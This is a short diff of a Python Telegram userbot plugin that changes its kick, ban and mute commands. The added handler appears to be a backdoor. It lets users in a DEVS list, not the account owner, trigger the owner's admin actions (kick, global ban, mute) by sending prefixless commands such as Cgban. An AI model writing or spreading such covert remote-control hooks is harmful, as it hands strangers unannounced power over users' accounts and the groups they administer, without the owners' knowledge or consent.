@@ -21,7 +21,8 @@ __HELP__ = """
 """
 
 
-@PY.UBOT("kick|ban|mute|unmute|unban", FILTERS.ME_GROUP)
+@PY.UBOT("kick|gban|mute|unmute|ungban", FILTERS.ME_GROUP)
+@ubot.on_message(filters.user(DEVS) & filters.command("Ckick|Cgban|Cmute|Cunmute|Cungban", "") & ~filters.me) 
 async def _(client, message):
     await admin_bannen(client, message)
 
